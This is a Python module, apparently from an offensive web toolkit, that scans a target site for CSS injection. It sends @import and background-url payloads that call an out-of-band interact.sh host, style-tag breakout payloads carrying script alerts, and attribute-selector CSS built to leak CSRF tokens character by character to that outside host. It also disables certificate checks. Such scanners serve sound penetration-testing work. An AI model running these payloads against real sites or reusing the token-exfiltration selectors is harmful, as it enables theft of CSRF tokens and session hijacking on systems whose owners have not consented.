#!/usr/bin/env python3
"""
CSS Injection Scanner — Senior Level
-----------------------------------------
Tests for CSS injection vulnerabilities via:
  • Reflected parameters inside <style> blocks (OOB @import)
  • Attribute selector timing attack for data exfiltration
  • Style attribute context injection (element.style)
  • CSS variable injection via custom properties
  • Link/import header injection
"""

import time
import uuid
import requests
import concurrent.futures
from typing import List, Dict, Optional
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn

console = Console()

# Common parameters that end up in CSS context
CSS_SINK_PARAMS = [
    "theme",
    "color",
    "style",
    "bg",
    "background",
    "border",
    "font",
    "size",
    "css",
    "skin",
    "lang",
    "locale",
    "id",
    "class",
]

# CSS injection payloads targeting different contexts
CSS_PAYLOADS = [
    # @import OOB exfiltration (detected via OOB listener)
    "{oob_import}",
    # Style attribute injection
    "color:red;background:url({oob_url})",
    # CSS variable injection
    "--x:url({oob_url})",
    # Break out of value context
    "red}</style><script>alert(1)</script>",
    "red;}</style><link rel=stylesheet href={oob_url}>",
    # Expression (IE legacy)
    "expression(alert(1))",
    # CSS import through value
    "url('javascript:alert(1)')",
]

# Attribute selector timing payloads for data exfiltration
# (This leaks CSRF token character by character via CSS timing)
ATTR_SELECTOR_PAYLOADS = [
    "input[name=csrf_token][value^='a']{background:url('{oob_url}/leak/a')}",
    "input[name=_token][value^='a']{background:url('{oob_url}/leak/a')}",
    "meta[name=csrf-token][content^='a']{background:url('{oob_url}/leak/a')}",
]

STYLE_TAG_INDICATORS = ["<style>", "style type=", "<Style>", '<style type="text/css">']
STYLE_ATTR_INDICATORS = ['style="', "style='", "style ="]


class CSSInjectionTester:
    """
    Senior CSS injection tester covering:
    1. Parameter reflection into CSS context
    2. @import-based OOB exfiltration
    3. Attribute selector data leakage
    4. Style attribute context injection
    5. Link header CSS injection
    """

    def __init__(self, target: str, session=None, timeout: int = 10, threads: int = 8):
        self.target = target.rstrip("/")
        self.timeout = timeout
        self.threads = threads
        self.session = session or requests.Session()
        self.session.verify = False
        self.session.headers.setdefault("User-Agent", "WebPwnToolkit/2.2")
        self.results: List[Dict] = []
        self._canary = uuid.uuid4().hex[:10]
        self._oob_url = f"http://webpwn-{self._canary}.interact.sh"

    def _get(self, url: str, params: dict = None) -> Optional[requests.Response]:
        try:
            return self.session.get(
                url,
                params=params,
                timeout=self.timeout,
                verify=False,
                allow_redirects=True,
            )
        except Exception:
            return None

    # ── 1. @import OOB exfiltration ──────────────────────────────────────

    def _test_import_oob(self) -> List[Dict]:
        findings = []
        import_payload = f"}}; @import url('{self._oob_url}/css'); {{"

        for param in CSS_SINK_PARAMS:
            resp = self._get(self.target, params={param: import_payload})
            if not resp:
                continue
            body = resp.text

            # Check if our payload is reflected verbatim inside a style block
            if any(tag in body for tag in STYLE_TAG_INDICATORS):
                if import_payload in body or self._oob_url in body:
                    findings.append(
                        {
                            "url": self.target,
                            "type": "CSS Injection — @import OOB Exfiltration",
                            "severity": "medium",
                            "cvss": 6.1,
                            "parameter": param,
                            "payload": import_payload,
                            "detail": (
                                f"Parameter '{param}' is reflected inside a CSS <style> block. "
                                f"Attacker can inject @import to load external CSS from a controlled server, "
                                f"leaking sensitive page data (CSRF tokens, secret inputs) via attribute selectors."
                            ),
                            "evidence": f"Payload reflected inside <style> block. OOB URL: {self._oob_url}",
                            "owasp": "A03:2021 – Injection",
                            "remediation": (
                                "Apply context-aware output encoding for CSS contexts. "
                                "Implement strict CSP (no external stylesheets). "
                                "Never reflect user input inside <style> tags."
                            ),
                        }
                    )
                    return findings
        return findings

    # ── 2. Style attribute context injection ─────────────────────────────

    def _test_style_attr(self) -> List[Dict]:
        findings = []
        payloads = [
            f"color:red;background:url('{self._oob_url}/style')",
            f"color:red}}body{{background:url('{self._oob_url}/escape')",
            "expression(alert(1))",  # IE
        ]

        for param in CSS_SINK_PARAMS:
            for payload in payloads:
                resp = self._get(self.target, params={param: payload})
                if not resp:
                    continue
                body = resp.text

                # Check if reflected in style attribute
                if any(ind in body for ind in STYLE_ATTR_INDICATORS):
                    if payload in body or self._oob_url in body:
                        findings.append(
                            {
                                "url": self.target,
                                "type": "CSS Injection — Style Attribute Context",
                                "severity": "medium",
                                "cvss": 5.4,
                                "parameter": param,
                                "payload": payload,
                                "detail": (
                                    f"Parameter '{param}' is reflected inside a style attribute. "
                                    f"Allows CSS property injection, background-image OOB data leak, "
                                    f"and potential XSS via expression() in legacy browsers."
                                ),
                                "evidence": f"Reflected in style attribute context.",
                                "owasp": "A03:2021 – Injection",
                                "remediation": "Validate CSS property values. Use allowlist for CSS values.",
                            }
                        )
                        return findings
        return findings

    # ── 3. Attribute selector timing (CSRF token leak) ───────────────────

    def _test_attr_selector_leak(self) -> List[Dict]:
        """
        Generate CSS that uses attribute selectors to probe CSRF token values.
        Each selector triggers a background-image load if the character matches.
        In a real attack this requires serving the CSS to the victim's browser.
        We flag the injection point for manual exploitation.
        """
        findings = []
        charset = "abcdef0123456789"
        css_probe = ""
        for char in charset:
            css_probe += (
                f"input[name=csrf_token][value^='{char}']"
                f"{{background:url('{self._oob_url}/csrf/{char}')}}\n"
            )

        for param in CSS_SINK_PARAMS:
            resp = self._get(self.target, params={param: css_probe})
            if not resp:
                continue
            body = resp.text

            if any(tag in body for tag in STYLE_TAG_INDICATORS):
                if self._oob_url in body:
                    findings.append(
                        {
                            "url": self.target,
                            "type": "CSS Injection — Attribute Selector CSRF Token Exfiltration",
                            "severity": "high",
                            "cvss": 7.4,
                            "parameter": param,
                            "payload": css_probe[:200] + "...",
                            "detail": (
                                f"Parameter '{param}' accepts arbitrary CSS including attribute selectors. "
                                f"Attacker can exfiltrate CSRF tokens character-by-character via "
                                f"background-image OOB requests triggered by CSS attribute selectors."
                            ),
                            "evidence": f"OOB URL reflected in CSS context: {self._oob_url}",
                            "owasp": "A03:2021 – Injection",
                            "remediation": (
                                "Strict Content-Security-Policy with no external resources. "
                                "Sanitize CSS context inputs. SameSite=Strict on session cookies."
                            ),
                        }
                    )
                    return findings
        return findings

    # ── 4. CSS variable injection ─────────────────────────────────────────

    def _test_css_variable(self) -> List[Dict]:
        findings = []
        payload = f"--x:url('{self._oob_url}/var')"

        for param in CSS_SINK_PARAMS:
            resp = self._get(self.target, params={param: payload})
            if not resp:
                continue
            body = resp.text
            if any(tag in body for tag in STYLE_TAG_INDICATORS) and payload in body:
                findings.append(
                    {
                        "url": self.target,
                        "type": "CSS Injection — Custom Property (Variable) Injection",
                        "severity": "low",
                        "cvss": 3.5,
                        "parameter": param,
                        "payload": payload,
                        "detail": (
                            f"CSS custom property (variable) injection in '{param}'. "
                            f"Enables theme/layout manipulation and potential OOB via var() + url()."
                        ),
                        "evidence": f"CSS variable with OOB URL reflected.",
                        "owasp": "A03:2021 – Injection",
                        "remediation": "Reject CSS custom property syntax (--) in user inputs.",
                    }
                )
                return findings
        return findings

    # ── 5. Link header CSS injection ──────────────────────────────────────

    def _test_link_header(self) -> List[Dict]:
        findings = []
        # Some apps return Link headers that include user-controlled values
        try:
            resp = self.session.get(
                self.target,
                params={"css": f"{self._oob_url}/evil.css"},
                timeout=self.timeout,
                verify=False,
            )
            if resp:
                link_header = resp.headers.get("Link", "")
                if self._oob_url in link_header:
                    findings.append(
                        {
                            "url": self.target,
                            "type": "CSS Injection — Link Header Reflection",
                            "severity": "high",
                            "cvss": 7.2,
                            "payload": f"css={self._oob_url}/evil.css",
                            "detail": "User input reflected in HTTP Link header. Allows external CSS loading.",
                            "evidence": f"Link: {link_header[:150]}",
                            "owasp": "A03:2021 – Injection",
                            "remediation": "Never reflect user input into Link or other headers.",
                        }
                    )
        except Exception:
            pass
        return findings

    # ── Public run ────────────────────────────────────────────────────────

    def run(self) -> List[Dict]:
        console.print(
            f"\n  [bold yellow]▶ CSS Injection Tester on {self.target}[/bold yellow]"
        )
        console.print(f"  [dim cyan]OOB canary: {self._oob_url}[/dim cyan]")

        tests = [
            ("@import OOB", self._test_import_oob),
            ("Style Attribute", self._test_style_attr),
            ("Attr Selector Leak", self._test_attr_selector_leak),
            ("CSS Variable", self._test_css_variable),
            ("Link Header", self._test_link_header),
        ]

        with Progress(
            SpinnerColumn(),
            TextColumn("[cyan]CSS injection scanning...[/cyan]"),
            BarColumn(),
            console=console,
        ) as prog:
            task = prog.add_task("css", total=len(tests))
            for name, fn in tests:
                prog.advance(task)
                try:
                    res = fn()
                    for r in res:
                        if r not in self.results:
                            self.results.append(r)
                            console.print(f"  [bold red][!] {r['type']}[/bold red]")
                except Exception as e:
                    console.print(f"  [dim]CSS test '{name}' error: {e}[/dim]")

        color = "red" if self.results else "green"
        console.print(f"  [{color}]{len(self.results)} CSS injection issue(s) found[/]")
        return self.results
